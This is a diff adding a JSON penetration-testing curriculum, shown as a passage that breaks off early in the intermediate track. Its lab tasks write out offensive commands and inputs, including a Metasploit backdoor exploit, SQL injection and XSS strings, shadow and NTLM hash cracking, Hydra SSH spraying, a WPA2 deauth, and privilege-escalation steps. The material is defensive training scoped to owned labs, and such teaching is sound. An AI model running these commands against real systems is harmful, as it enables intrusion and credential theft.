@@ -1,0 +1,573 @@
+{
+  "domain": "Penetration Testing",
+  "name": "Penetration Testing",
+  "category": "Cybersecurity and Identity",
+  "icon": "shield",
+  "aliases": ["Pentesting", "Ethical Security Testing", "Pentest", "Pen Testing", "Network Penetration Testing", "Infrastructure Penetration Testing", "Authorised Penetration Testing", "Pen Test"],
+  "certifications": ["OffSec OSCP (PEN-200)", "OffSec OSEP (PEN-300)", "GIAC GPEN", "GIAC GXPN", "CompTIA PenTest+", "INE eJPT", "INE eCPPT"],
+  "tools": ["Nmap", "Burp Suite", "Metasploit Framework", "Wireshark", "BloodHound", "Impacket", "NetExec", "Hashcat", "John the Ripper", "Hydra", "ffuf", "sqlmap", "Kali Linux"],
+  "review_status": "unreviewed",
+  "levels": {
+    "beginner": {
+      "summary": "For aspiring penetration testers, security analysts and sysadmins who can use a Linux shell and understand TCP/IP but have not run a structured, authorised test. It teaches the full workflow against isolated, learner-owned labs (HTB/TryHackMe-style ranges, Metasploitable and DVWA): legal authorisation and rules of engagement first, then PTES, OSSTMM and NIST SP 800-115 methodology, reconnaissance, Nmap scanning, vulnerability analysis with CVSS 4.0, web testing with Burp Suite, exploitation with Metasploit, Linux and Windows privilege escalation, password auditing, pivoting, wireless awareness, and remediation-focused reporting with a defence and detection angle throughout.",
+      "prerequisites": ["Comfortable on a Linux shell: navigating directories, editing files, piping commands and managing packages with apt", "Understands TCP/IP basics: IP addressing, ports, the TCP handshake, DNS and HTTP request/response", "Owns an isolated practice lab (nested VMs or a private HTB/TryHackMe range) with legal authorisation to attack every target in it"],
+      "outcomes": ["Scope an authorised test, record rules of engagement and map activity to PTES, OSSTMM and NIST SP 800-115", "Run a full reconnaissance-to-exploitation workflow against lab targets using Nmap, Burp Suite and Metasploit", "Escalate privileges on Linux and Windows lab hosts and audit passwords with Hashcat and John the Ripper", "Score findings with CVSS 4.0, write a remediation-focused report and describe the defensive detections each attack leaves behind"],
+      "days": [
+        {
+          "topic": "Authorisation, Scoping and Rules of Engagement for Lab Pentests",
+          "subtopics": ["Written authorisation and why testing without it is a crime (Computer Misuse / CFAA style laws)", "Defining in-scope IP ranges, hosts and URLs, and explicit out-of-scope exclusions", "Rules of engagement: test windows, rate limits, prohibited actions and data-handling rules", "Black-box, grey-box and white-box engagement models", "Emergency contacts, stop conditions and the get-out-of-jail letter", "Confirming the lab is isolated and learner-owned before any packet is sent", "Deconfliction with blue teams and change freezes", "Recording scope and authorisation as evidence for the final report"],
+          "tools": ["Markdown editor", "Draw.io", "Kali Linux"],
+          "lab_task": "Write a one-page rules-of-engagement document for your isolated lab (for example a 10.10.10.0/24 TryHackMe range you own). List in-scope hosts, out-of-scope addresses, the test window, prohibited actions and a stop condition. Add a line stating testing runs only against the provided lab targets. Save as roe.md and validate the CIDR with `ipcalc 10.10.10.0/24`.",
+          "deliverable": "Signed-style roe.md with scope table, authorisation statement and stop conditions",
+          "checks": [["Open roe.md and look for the scope and authorisation sections", "Both an in-scope list and an explicit authorisation statement are present", "roe.md file"], ["Run ipcalc 10.10.10.0/24", "Reports 254 usable hosts for the /24 range", "Terminal output"], ["Ask a peer to attack a host not listed in roe.md", "The action is rejected as out of scope and logged", "Reviewer note"]],
+          "objectives": ["Explain why written authorisation is mandatory before testing", "Define in-scope and out-of-scope assets with rules of engagement", "Record scope and authorisation as report evidence"]
+        },
+        {
+          "topic": "Penetration Testing Methodologies: PTES, OSSTMM and NIST SP 800-115",
+          "subtopics": ["The seven PTES phases from pre-engagement to reporting", "OSSTMM channels and the idea of measurable operational security", "NIST SP 800-115 four-stage technical testing process", "Mapping a single engagement onto all three frameworks", "MITRE ATT&CK as a tactic-and-technique reference", "Choosing a methodology for network, web and cloud targets", "Repeatability: why a documented method beats ad-hoc hacking", "Where detection and remediation fit in each framework"],
+          "tools": ["Markdown editor", "MITRE ATT&CK Navigator", "Kali Linux"],
+          "lab_task": "Build a methodology cheat-sheet mapping your planned lab test to PTES, OSSTMM and NIST SP 800-115. For one target, list the activity you will perform in each PTES phase. Open the MITRE ATT&CK Navigator and tag three techniques you expect to use (for example T1046 Network Service Discovery). Export the layer JSON and save method.md.",
+          "deliverable": "method.md cheat-sheet plus an exported ATT&CK Navigator layer",
+          "checks": [["Count the PTES phases documented in method.md", "All seven phases are present and mapped to an activity", "method.md file"], ["Open the exported Navigator layer JSON", "At least three techniques including T1046 are tagged", "Layer JSON"], ["Ask which NIST SP 800-115 stage covers active scanning", "Answer identifies the Discovery stage", "Reviewer note"]],
+          "objectives": ["Describe the PTES, OSSTMM and NIST SP 800-115 phases", "Map one engagement onto all three methodologies", "Reference attacker techniques with MITRE ATT&CK"]
+        },
+        {
+          "topic": "Provisioning an Isolated Pentest Lab with Kali and Vulnerable Targets",
+          "subtopics": ["Host-only and NAT networks that keep the lab off the internet", "Deploying Kali Linux as the attacker VM and updating with apt", "Standing up Metasploitable 2 and DVWA as deliberately vulnerable targets", "Snapshots so a target can be reset after exploitation", "Confirming isolation: the lab cannot reach production or the internet gateway", "Verifying reachability between attacker and targets with ping and arp", "Resource sizing and safe teardown of the environment", "Documenting the lab topology for the report"],
+          "tools": ["VirtualBox", "Kali Linux", "Metasploitable 2", "DVWA"],
+          "lab_task": "Build an isolated host-only lab: a Kali attacker and a Metasploitable 2 target on 192.168.56.0/24 with no internet route. From Kali run `ip a`, confirm the host-only interface, then `ping -c3` the target and `arp -a`. Take a VirtualBox snapshot named clean of the target. Confirm these are the only authorised targets you will test.",
+          "deliverable": "Lab topology diagram, snapshot name and connectivity evidence",
+          "checks": [["Run ping -c3 against the Metasploitable target", "3 packets transmitted, 0% packet loss", "Terminal output"], ["Try to reach 8.8.8.8 from a lab VM", "Request times out because the lab is isolated", "Terminal output"], ["List VirtualBox snapshots for the target", "A snapshot named clean exists", "VBoxManage snapshot list"]],
+          "objectives": ["Build an isolated host-only pentest lab", "Confirm the lab cannot reach production or the internet", "Use snapshots to reset vulnerable targets"]
+        },
+        {
+          "topic": "Passive Reconnaissance and OSINT Against Lab Scope",
+          "subtopics": ["Passive versus active reconnaissance and why passive leaves no target logs", "Building a target profile from provided lab documentation", "DNS record gathering with dig and host against a lab DNS server", "Certificate and banner metadata as information sources", "whois and WHOIS-style records in a self-hosted lab zone", "Organising findings into an asset and identity inventory", "Theoretical OSINT ethics and staying inside authorised scope", "Detection angle: what passive recon does and does not generate on the blue side"],
+          "tools": ["dig", "whois", "theHarvester", "Kali Linux"],
+          "lab_task": "Against your lab DNS server only, enumerate records with `dig @192.168.56.10 lab.local ANY` and `dig axfr lab.local @192.168.56.10`. Record discovered hostnames and IPs in an inventory. Run theHarvester against the lab domain with `theHarvester -d lab.local -b dns`. Note which steps generate no traffic on the targets themselves.",
+          "deliverable": "Asset inventory spreadsheet with hostnames, IPs and the recon source for each",
+          "checks": [["Run dig axfr lab.local against the lab DNS server", "A zone transfer returns the lab host records", "dig output"], ["Count hosts recorded in the inventory", "At least three distinct lab hosts are listed with IPs", "Inventory file"], ["Check which recon step touched the target hosts", "Passive DNS lookups generated no logs on the targets", "Analysis note"]],
+          "objectives": ["Distinguish passive from active reconnaissance", "Collect DNS and OSINT data within authorised scope", "Build an asset inventory from reconnaissance findings"]
+        },
+        {
+          "topic": "Host Discovery and Port Scanning with Nmap",
+          "subtopics": ["ARP, ICMP and TCP host discovery with Nmap -sn", "TCP SYN scanning with -sS and why it needs root", "TCP connect scanning with -sT when raw sockets are unavailable", "UDP scanning with -sU and interpreting open|filtered", "Port states: open, closed, filtered and unfiltered", "Selecting ports with -p, --top-ports and -p-", "Saving output with -oA for later parsing", "Detection angle: the firewall and IDS signatures a scan produces"],
+          "tools": ["Nmap", "Wireshark", "Kali Linux"],
+          "lab_task": "Against an in-scope lab host, discover live hosts with `nmap -sn 192.168.56.0/24`. Then run `sudo nmap -sS -p- -T4 -oA full_tcp 192.168.56.101` and a top-ports UDP scan `sudo nmap -sU --top-ports 20 192.168.56.101`. Capture the SYN scan in Wireshark and confirm SYN/RST behaviour. Record the open TCP ports found.",
+          "deliverable": "full_tcp.nmap/.gnmap/.xml output plus a list of open ports",
+          "checks": [["Run the SYN scan against the lab target", "At least ports 21, 22 and 80 are reported open", "nmap output"], ["Inspect the Wireshark capture for a closed port", "The target replies with a TCP RST", "Packet capture"], ["List the files produced by -oA full_tcp", "full_tcp.nmap, full_tcp.gnmap and full_tcp.xml exist", "Directory listing"]],
+          "objectives": ["Discover live hosts and scan TCP and UDP ports with Nmap", "Interpret port states from scan output", "Explain the network evidence a scan leaves for defenders"]
+        },
+        {
+          "topic": "Service and Version Enumeration with the Nmap Scripting Engine",
+          "subtopics": ["Service and version detection with -sV and intensity levels", "OS fingerprinting with -O and its reliability limits", "NSE script categories: default, safe, discovery and vuln", "Running targeted scripts such as http-enum and smb-os-discovery", "Reading the NSE output and cross-checking with the service banner", "Updating the script database with nmap --script-updatedb", "Turning findings into candidate vulnerabilities to validate", "Detection angle: noisy version probes and how blue teams spot them"],
+          "tools": ["Nmap", "netcat", "Kali Linux"],
+          "lab_task": "Enumerate the lab target with `sudo nmap -sV -O -p21,22,80,139,445 192.168.56.101` then run NSE scripts: `nmap -p445 --script smb-os-discovery 192.168.56.101` and `nmap -p80 --script http-enum 192.168.56.101`. Banner-grab port 21 with `nc 192.168.56.101 21`. Record the service, version and a candidate vulnerability for each open port.",
+          "deliverable": "Service matrix listing port, service, version and candidate issue",
+          "checks": [["Run -sV against the target FTP port", "The vsftpd service and its version string are reported", "nmap output"], ["Run the smb-os-discovery script", "The script returns the target OS and computer name", "nmap output"], ["Banner-grab port 21 with netcat", "A 220 FTP service-ready banner is returned", "Terminal output"]],
+          "objectives": ["Enumerate service versions and OS with Nmap", "Run targeted NSE scripts against lab services", "Derive candidate vulnerabilities from enumeration"]
+        },
+        {
+          "topic": "Vulnerability Analysis and CVSS 4.0 Triage",
+          "subtopics": ["Turning enumeration output into confirmed and candidate findings", "Automated scanning with OpenVAS/Greenbone against lab targets", "Matching services to CVEs with searchsploit and the NVD", "CVSS 4.0 base metrics: attack vector, complexity, privileges and impact", "Building and reading a CVSS 4.0 vector string", "Distinguishing exploitability from theoretical risk", "Prioritising findings for the exploitation phase", "False positives and manual validation before claiming a finding"],
+          "tools": ["OpenVAS", "searchsploit", "CVSS 4.0 calculator", "Kali Linux"],
+          "lab_task": "Run an OpenVAS full-and-fast scan against one lab host. Export the results, pick the highest-severity finding and confirm it with `searchsploit <service version>`. Build a CVSS 4.0 vector for it in the FIRST calculator (for example AV:N/AC:L/AT:N/PR:N/UI:N) and record the base score. List which findings you will actually attempt to exploit.",
+          "deliverable": "Triaged findings table with CVSS 4.0 vectors, scores and exploit decisions",
+          "checks": [["Search exploit-db with searchsploit for the vulnerable service", "At least one matching exploit entry is returned", "searchsploit output"], ["Compute the CVSS 4.0 base score for the top finding", "The calculator returns a numeric score and a CVSS:4.0 vector string", "Calculator screenshot"], ["Review a flagged finding against the live service", "The finding is confirmed or marked a false positive with a reason", "Triage note"]],
+          "objectives": ["Produce a prioritised list of validated findings", "Score vulnerabilities with CVSS 4.0 vectors", "Separate exploitable issues from theoretical risk"]
+        },
+        {
+          "topic": "Web Application Mapping and Proxying with Burp Suite",
+          "subtopics": ["Configuring the browser and Burp proxy with the Burp CA certificate", "Capturing and editing requests in the Proxy and Repeater tabs", "Spidering and building the site map of a lab web app", "Reading HTTP methods, status codes and headers", "Target scope settings so Burp only touches in-scope hosts", "Identifying parameters, cookies and hidden form fields", "Passive scanning findings and their limits", "Detection angle: proxy traffic patterns a WAF can flag"],
+          "tools": ["Burp Suite", "Firefox", "DVWA"],
+          "lab_task": "Point Firefox at Burp (127.0.0.1:8080), install the Burp CA, and browse DVWA running on your lab host. Set the Burp target scope to the lab IP only. Map the site, send a login request to Repeater, change a parameter and resend. Record the status codes returned and confirm Burp never sent traffic outside the lab scope.",
+          "deliverable": "Burp project file with site map, scope settings and an annotated Repeater request",
+          "checks": [["Browse the app with Burp intercepting", "Requests to the lab host appear in the Burp HTTP history", "Burp history"], ["Resend a modified login request from Repeater", "The server responds with an HTTP 200 or 302 status", "Repeater response"], ["Check Burp target scope after browsing", "Only the in-scope lab host is listed and out-of-scope traffic is dropped", "Scope settings"]],
+          "objectives": ["Proxy and map a web app with Burp Suite", "Edit and replay requests with Repeater", "Constrain tooling to authorised scope"]
+        },
+        {
+          "topic": "Exploiting Known Vulnerabilities with Metasploit Framework",
+          "subtopics": ["Starting the database and msfconsole workspace", "Searching modules and reading module options with show options", "Choosing a payload: staged versus stageless, bind versus reverse", "Setting RHOSTS, LHOST and running check before exploit", "Gaining and interacting with a Meterpreter or shell session", "Managing multiple sessions and backgrounding", "Confirming exploitation with a proof artefact", "Detection angle: the host and network indicators exploitation creates"],
+          "tools": ["Metasploit Framework", "msfvenom", "Metasploitable 2"],
+          "lab_task": "In msfconsole against Metasploitable 2 only, search the vsftpd 2.3.4 backdoor module, set RHOSTS to the lab target, run check then exploit. Confirm a shell with `id` and `hostname`. Background the session, run `sessions -l`, then interact again. Record the proof output. Note what a defender would see in auth and network logs.",
+          "deliverable": "msfconsole log showing the session, id output and session list",
+          "checks": [["Run exploit against the vulnerable FTP service", "A command session or shell opens on the target", "msfconsole log"], ["Run id in the session", "The output shows uid=0(root)", "Session output"], ["Run sessions -l after backgrounding", "The active session is listed with its target address", "msfconsole output"]],
+          "objectives": ["Exploit a known vulnerability with Metasploit", "Manage and interact with sessions", "Capture proof-of-exploitation evidence"]
+        },
+        {
+          "topic": "Linux Privilege Escalation on Lab Hosts",
+          "subtopics": ["Enumerating the current user, groups and sudo rights", "Automated enumeration with LinPEAS and reading its highlights", "SUID and SGID binaries and GTFOBins techniques", "Writable cron jobs and PATH abuse", "Kernel version checks and exploit suitability", "Weak file permissions on sensitive files such as /etc/passwd", "Stabilising a shell and confirming root", "Detection angle: audit events privilege escalation triggers"],
+          "tools": ["LinPEAS", "GTFOBins", "Metasploitable 2"],
+          "lab_task": "From a low-privilege shell on a lab Linux host, run `sudo -l`, `find / -perm -4000 -type f 2>/dev/null` and LinPEAS. Identify one SUID binary listed on GTFOBins and use it to read a root-only file or spawn a root shell. Confirm with `id`. Document the exact escalation path. Note the auditd events the action would generate.",
+          "deliverable": "Privilege-escalation write-up with the enumeration output and root proof",
+          "checks": [["Run find for SUID binaries", "A list of setuid binaries is returned including a GTFOBins-exploitable one", "Terminal output"], ["Exploit the chosen SUID path", "A root shell or root-owned file read succeeds", "Shell output"], ["Run id after escalation", "The output shows uid=0(root)", "Terminal output"]],
+          "objectives": ["Enumerate a Linux host for escalation vectors", "Exploit a SUID or misconfiguration to reach root", "Describe the audit trail escalation leaves"]
+        },
+        {
+          "topic": "Windows Privilege Escalation on Lab Hosts",
+          "subtopics": ["Enumerating users, groups and privileges with whoami /all", "Automated checks with WinPEAS and PowerUp", "Unquoted service paths and weak service permissions", "AlwaysInstallElevated and registry misconfigurations", "Token privileges such as SeImpersonatePrivilege", "Stored credentials in files, registry and the SAM", "Confirming SYSTEM and capturing proof", "Detection angle: Windows event IDs that flag escalation"],
+          "tools": ["WinPEAS", "PowerUp", "Windows lab VM"],
+          "lab_task": "On a Windows lab VM, run `whoami /priv` and WinPEAS. Identify a privilege-escalation vector such as an unquoted service path or SeImpersonatePrivilege. Exploit it (for example with a potato technique or by replacing a service binary) to gain SYSTEM. Confirm with `whoami`. Record the vector and the Windows event IDs a SOC would see.",
+          "deliverable": "Windows escalation write-up with the vector, exploit steps and SYSTEM proof",
+          "checks": [["Run whoami /priv on the lab host", "The privileges list is shown including any that are Enabled", "Terminal output"], ["Exploit the identified escalation vector", "A SYSTEM-level process or shell is obtained", "Shell output"], ["Run whoami after escalation", "The output reads nt authority\\system", "Terminal output"]],
+          "objectives": ["Enumerate a Windows host for escalation vectors", "Exploit a misconfiguration or token privilege to reach SYSTEM", "Identify the Windows events escalation generates"]
+        },
+        {
+          "topic": "Password Auditing and Hash Cracking in the Lab",
+          "subtopics": ["Where credentials live: /etc/shadow, the SAM and service configs", "Hash identification with hashid and hash-identifier", "Dictionary attacks with John the Ripper and rules", "GPU and mask attacks with Hashcat modes", "Wordlists such as rockyou and targeted mutations", "Online password spraying with Hydra against a lab service", "Measuring password strength and reporting policy gaps", "Detection angle: lockouts and failed-logon events spraying triggers"],
+          "tools": ["Hashcat", "John the Ripper", "Hydra"],
+          "lab_task": "From a captured lab /etc/shadow, identify the hash type with `hashid`, then crack with `john --wordlist=/usr/share/wordlists/rockyou.txt shadow` and verify with `john --show`. Run a Hashcat mask attack on an NTLM hash: `hashcat -m 1000 -a 3 hash.txt ?u?l?l?l?d?d`. Spray one lab SSH account with `hydra -l bob -P rockyou.txt ssh://192.168.56.101`.",
+          "deliverable": "Password-audit report with cracked counts, methods and policy recommendations",
+          "checks": [["Run john --show after cracking", "At least one username and plaintext password pair is revealed", "john output"], ["Run the Hashcat NTLM mask attack", "Hashcat reports the hash as Cracked with the recovered value", "hashcat output"], ["Run the Hydra SSH spray against the lab account", "Hydra reports a valid login for the account or exhausts the list", "hydra output"]],
+          "objectives": ["Identify and crack password hashes in the lab", "Run online and offline password attacks", "Report password-policy weaknesses with detection notes"]
+        },
+        {
+          "topic": "SMB, LDAP and SNMP Enumeration Techniques",
+          "subtopics": ["SMB share and session enumeration with smbclient and smbmap", "Null sessions and anonymous access checks", "RID cycling and user enumeration with enum4linux-ng", "LDAP queries against a lab directory with ldapsearch", "SNMP community strings and MIB walking with snmpwalk", "Mapping enumerated users to later attacks", "Recording share permissions and exposed data", "Detection angle: directory and SMB audit events enumeration raises"],
+          "tools": ["enum4linux-ng", "smbclient", "snmpwalk", "ldapsearch"],
+          "lab_task": "Against a lab host, list SMB shares with `smbclient -L //192.168.56.101 -N` and `smbmap -H 192.168.56.101`. Enumerate users with `enum4linux-ng -A 192.168.56.101`. Walk SNMP with `snmpwalk -v2c -c public 192.168.56.101`. Query the directory with `ldapsearch -x -H ldap://192.168.56.101 -b dc=lab,dc=local`. Record shares, users and community strings found.",
+          "deliverable": "Enumeration report listing shares, usernames, SNMP strings and LDAP objects",
+          "checks": [["List SMB shares anonymously", "One or more shares are returned, including any world-readable share", "smbclient output"], ["Run enum4linux-ng against the host", "A list of local or domain usernames is produced", "enum4linux-ng output"], ["Walk SNMP with community string public", "The SNMP tree returns system information for the host", "snmpwalk output"]],
+          "objectives": ["Enumerate SMB, LDAP and SNMP on lab hosts", "Extract users, shares and community strings", "Note the audit events enumeration generates"]
+        },
+        {
+          "topic": "Manual Web Vulnerability Testing: Injection and Cross-Site Scripting",
+          "subtopics": ["Finding injectable parameters by observing error behaviour", "Manual SQL injection: breaking and confirming a query", "UNION-based extraction of table and column data", "Reflected and stored cross-site scripting proof payloads", "Input validation, encoding and where defences fail", "Using Burp Repeater to iterate payloads safely", "Capturing non-destructive proof rather than causing damage", "Detection angle: WAF signatures and application error logs"],
+          "tools": ["Burp Suite", "DVWA", "sqlmap"],
+          "lab_task": "On DVWA (low security) in your lab, confirm SQL injection in the id parameter with `' OR '1'='1` then extract the database version using a UNION query via Burp Repeater. Confirm reflected XSS by injecting `<script>alert(1)</script>` and observing it execute. Validate the SQLi with `sqlmap -u 'http://192.168.56.101/vulnerabilities/sqli/?id=1' --batch --dbs`.",
+          "deliverable": "Web findings write-up with the payloads, responses and screenshots",
+          "checks": [["Submit the UNION injection in the id parameter", "The response discloses the database version string", "Burp response"], ["Inject the XSS payload and load the page", "A JavaScript alert dialog executes in the browser", "Browser screenshot"], ["Run sqlmap against the id parameter", "sqlmap confirms the parameter is injectable and lists databases", "sqlmap output"]],
+          "objectives": ["Find and confirm SQL injection manually", "Prove reflected and stored XSS safely", "Describe the server-side evidence web attacks create"]
+        },
+        {
+          "topic": "Pivoting and Network Tunnelling Between Lab Segments",
+          "subtopics": ["Why pivoting is needed to reach a second lab subnet", "Adding routes through a compromised host with Metasploit autoroute", "SOCKS proxying with the Metasploit socks_proxy module and proxychains", "SSH local, remote and dynamic port forwarding", "Scanning an internal subnet through the pivot", "Chisel as an alternative tunnelling tool", "Keeping the tunnel inside authorised scope", "Detection angle: unusual internal connections a pivot creates"],
+          "tools": ["Metasploit Framework", "proxychains", "SSH", "chisel"],
+          "lab_task": "From a Meterpreter session on a dual-homed lab host, run `run autoroute -s 10.10.20.0/24`, start socks_proxy, then set proxychains to 127.0.0.1:1080 and scan the internal subnet with `proxychains nmap -sT -Pn 10.10.20.5`. Alternatively set up SSH dynamic forwarding with `ssh -D 1080 user@pivot`. Confirm you reach a host only accessible via the pivot.",
+          "deliverable": "Pivoting write-up with routes added and proof of reaching the internal host",
+          "checks": [["Add the autoroute and run proxychains nmap to the internal subnet", "Open ports on the internal-only host are returned", "nmap output"], ["List active routes in the Meterpreter session", "A route to the 10.10.20.0/24 subnet is present", "Metasploit output"], ["Try reaching the internal host without the tunnel", "The connection fails because the subnet is not directly routable", "Terminal output"]],
+          "objectives": ["Pivot into a second subnet through a compromised host", "Tunnel scans and traffic with SOCKS and SSH forwarding", "Explain the anomalous connections pivoting produces"]
+        },
+        {
+          "topic": "Wireless Penetration Testing Awareness and WPA2 Lab Capture",
+          "subtopics": ["Wireless modes and putting an adapter into monitor mode", "802.11 frames, SSIDs, BSSIDs and channels", "Capturing a WPA2 four-way handshake in a lab network you own", "Offline handshake cracking with Hashcat mode 22000", "WPS and weak-PSK risks at an awareness level", "Rogue access point and evil-twin concepts in theory", "Staying legal: only your own lab wireless network", "Detection angle: wireless IDS and deauthentication alerts"],
+          "tools": ["aircrack-ng", "hcxtools", "Hashcat"],
+          "lab_task": "Against a WPA2 access point you own in the lab, put the adapter in monitor mode with `airmon-ng start wlan0`, capture with `airodump-ng -c 6 --bssid <AP> -w cap wlan0mon`, and force a reconnect with a single `aireplay-ng --deauth 1`. Convert the capture with hcxpcapngtool and crack with `hashcat -m 22000 cap.hc22000 rockyou.txt`. Confirm the PSK you set is recovered.",
+          "deliverable": "Wireless write-up with the captured handshake and recovered PSK",
+          "checks": [["Run airodump-ng on the target channel", "A WPA handshake is captured and flagged in the airodump header", "airodump output"], ["Run hashcat mode 22000 on the converted capture", "The pre-shared key you configured is recovered", "hashcat output"], ["Confirm the AP under test is lab-owned", "The BSSID matches the learner-owned access point only", "Lab inventory"]],
+          "objectives": ["Capture a WPA2 handshake from a lab-owned AP", "Crack a weak PSK offline with Hashcat", "Explain wireless IDS detection of the attack"]
+        },
+        {
+          "topic": "Detection and Defence: Logging Pentest Activity",
+          "subtopics": ["Why every offensive action has a defensive counterpart", "Where scans, logins and exploits appear in system logs", "Linux auth.log and auditd events for the attacks performed", "Windows Security event IDs for logons and new services", "Network indicators in firewall and IDS logs", "Mapping each finding to a detection recommendation", "Suricata/Snort signatures that catch common tooling", "Writing detection guidance into the report"],
+          "tools": ["Suricata", "journalctl", "Windows Event Viewer"],
+          "lab_task": "Re-run three earlier attacks (an Nmap scan, an SSH brute force and a Metasploit exploit) against a lab host running Suricata. Collect the matching evidence: `journalctl -u ssh`, Windows Security events, and Suricata fast.log alerts. For each attack, record the exact log line or event ID a defender would use to detect it and a recommended detection rule.",
+          "deliverable": "Detection matrix mapping each attack to its log evidence and a detection rule",
+          "checks": [["Brute force SSH then read the auth log", "Repeated Failed password entries for the account are present", "journalctl output"], ["Run the Nmap scan with Suricata monitoring", "Suricata fast.log records a port-scan alert", "Suricata log"], ["Trigger the Metasploit exploit", "A new-process or new-service event is recorded on the target", "Event log"]],
+          "objectives": ["Locate the log evidence each attack produces", "Map offensive actions to defensive detections", "Recommend detection rules in the report"]
+        },
+        {
+          "topic": "Evidence Handling, Screenshots and Note-Taking",
+          "subtopics": ["Contemporaneous notes with timestamps and commands", "Tools such as CherryTree, Obsidian or a structured markdown log", "Capturing command output and screenshots as proof", "Organising evidence per host and per finding", "Chain-of-custody thinking for sensitive data", "Redacting or securely storing captured credentials", "Reproducibility: another tester repeating your steps", "Preparing evidence for the final report and retest"],
+          "tools": ["CherryTree", "Flameshot", "Kali Linux"],
+          "lab_task": "Set up a structured note tree (one node per host) in CherryTree. For a single finding, record the timestamped commands, paste the raw output and attach a screenshot of the proof. Export the notes to HTML. Verify another tester could reproduce the finding from your notes alone by having a peer follow them against a fresh snapshot.",
+          "deliverable": "Exported evidence pack: per-host notes, command logs and screenshots",
+          "checks": [["Open the exported notes for one finding", "Timestamped commands, raw output and a screenshot are all present", "Exported HTML"], ["Have a peer reproduce the finding from the notes", "The peer reaches the same result without extra guidance", "Peer confirmation"], ["Check how captured credentials are stored", "Credentials are redacted or stored in an access-controlled location", "Evidence review"]],
+          "objectives": ["Keep reproducible, timestamped engagement notes", "Capture proof artefacts for each finding", "Handle sensitive captured data responsibly"]
+        },
+        {
+          "topic": "Writing a Pentest Report with CVSS and Remediation",
+          "subtopics": ["Report structure: executive summary, findings, methodology and appendix", "Writing an executive summary for a non-technical reader", "Per-finding template: description, impact, evidence, CVSS, remediation", "Assigning CVSS 4.0 vectors and severity ratings", "Actionable, prioritised remediation guidance", "Including detection recommendations per finding", "Avoiding false certainty and overstated risk", "Preparing the report for a remediation retest"],
+          "tools": ["Markdown editor", "CVSS 4.0 calculator", "Pandoc"],
+          "lab_task": "Write a report for your lab engagement with an executive summary and at least three findings. For each finding include a description, impact, reproduction steps, evidence, a CVSS 4.0 vector with score, remediation and a detection note. State that all testing was performed only against the authorised lab targets. Convert to PDF with `pandoc report.md -o report.pdf`.",
+          "deliverable": "report.pdf with executive summary, three scored findings and remediation",
+          "checks": [["Open each finding in the report", "Every finding has a CVSS 4.0 vector, severity and remediation step", "report.pdf"], ["Convert the report with pandoc", "report.pdf is generated without errors", "Terminal output"], ["Read the scope statement in the report", "It confirms testing was limited to the authorised lab targets", "report.pdf"]],
+          "objectives": ["Structure a professional penetration-test report", "Document findings with CVSS 4.0 and remediation", "Communicate risk accurately to technical and executive readers"]
+        },
+        {
+          "topic": "Beginner Capstone: Authorised Black-Box Test of a Lab Host",
+          "subtopics": ["Confirming scope and authorisation before starting", "Full workflow: recon, scan, enumerate, exploit, escalate, report", "Capturing evidence and CVSS 4.0 scores throughout", "Producing a report with remediation and detection guidance", "Presenting findings and answering a retest question", "Reflecting on detection opportunities for each step"],
+          "tools": ["Nmap", "Burp Suite", "Metasploit Framework", "Hashcat"],
+          "lab_task": "Perform a timed black-box test of one authorised lab host from scratch: confirm scope, scan with Nmap, enumerate services, exploit one vulnerability, escalate to root or SYSTEM and extract a proof flag. Capture evidence at each step and write a short report with CVSS 4.0 scored findings, remediation and detection notes. Confirm you tested only the authorised lab target.",
+          "deliverable": "Complete engagement package: notes, evidence, proof flag and final report",
+          "checks": [["Follow the workflow end to end on the lab host", "A proof flag is retrieved from a privileged account", "Flag and evidence"], ["Review the final report findings", "Each finding carries a CVSS 4.0 score, remediation and detection note", "Report file"], ["Check the engagement scope record", "Only the single authorised lab host was tested", "Scope log"]],
+          "objectives": ["Run a full black-box engagement end to end", "Produce scored findings with remediation and detection", "Work strictly within authorised scope"]
+        }
+      ]
+    },
+    "intermediate": {
+      "summary": "For testers who can already run a recon-to-exploitation workflow and want depth across network, web, Active Directory, cloud and container targets in a learner-owned lab. It covers engagement planning and threat modelling, attack-surface mapping, Nmap evasion, advanced Burp Suite, SQL injection, SSRF and file inclusion, authentication and token attacks, Active Directory enumeration with BloodHound, Kerberoasting and lateral movement, Metasploit post-exploitation, cloud and container testing on owned accounts, API testing, detection engineering with MITRE ATT&CK, remediation retesting and CVSS 4.0 reporting. Every lab runs only against authorised lab targets and pairs each attack with its detection.",
+      "prerequisites": ["Completed the beginner track or can run a recon-to-exploitation workflow with Nmap, Burp Suite and Metasploit unaided", "Comfortable with Windows and Linux command lines, PowerShell basics and HTTP internals", "Has an isolated multi-host lab (for example a GOAD Active Directory range or an HTB-style network) that they own and are authorised to attack"],
+      "outcomes": ["Plan an engagement, threat-model the scope and run depth web and network testing against lab targets", "Enumerate and attack an Active Directory lab with BloodHound, Kerberoasting and lateral movement", "Test cloud, container and API targets you own and map every technique to MITRE ATT&CK detections", "Run a remediation retest and deliver a CVSS 4.0 report that stands up to client review"],
+      "days": [
+        {
+          "topic": "Engagement Planning and Threat Modelling for Lab Ranges",
+          "subtopics": ["Turning a scope document into a test plan and schedule", "Threat modelling the target with STRIDE and attack trees", "Identifying likely threat actors and their objectives", "Prioritising test effort against high-value lab assets", "Defining success criteria and proof requirements", "Risk, safety and rollback planning for intrusive tests", "Aligning the plan to PTES and MITRE ATT&CK tactics", "Recording assumptions and constraints for the report"],
+          "tools": ["Draw.io", "MITRE ATT&CK Navigator", "Markdown editor"],
+          "lab_task": "For your multi-host lab, produce a test plan: list assets, build a STRIDE threat model for the most valuable host and draw an attack tree ending at domain compromise. Map each planned step to an ATT&CK tactic. Define proof requirements for each objective. Record that all activity stays within the authorised lab range only. Save plan.md and the attack-tree diagram.",
+          "deliverable": "Engagement plan with threat model, attack tree and ATT&CK mapping",
+          "checks": [["Review the attack tree in plan.md", "It traces a path from initial access to domain compromise", "Attack-tree diagram"], ["Count STRIDE categories covered for the key host", "All six STRIDE categories are considered", "plan.md"], ["Check the ATT&CK mapping for the plan", "Each planned step is tagged with an ATT&CK tactic ID", "Navigator layer"]],
+          "objectives": ["Build a test plan from a scope document", "Threat-model a target with STRIDE and attack trees", "Map planned activity to ATT&CK tactics"]
+        },
+        {
+          "topic": "Attack Surface Mapping and Asset Inventory",
+          "subtopics": ["Consolidating recon into a single authoritative inventory", "Service fingerprinting across the whole lab range", "Virtual-host and subdomain discovery in a lab DNS zone", "Content discovery with ffuf and gobuster", "Identifying technology stacks with whatweb and Wappalyzer", "Grouping assets by exposure and likely attack path", "Tracking tested-versus-untested coverage", "Detection angle: enumeration volume and rate anomalies"],
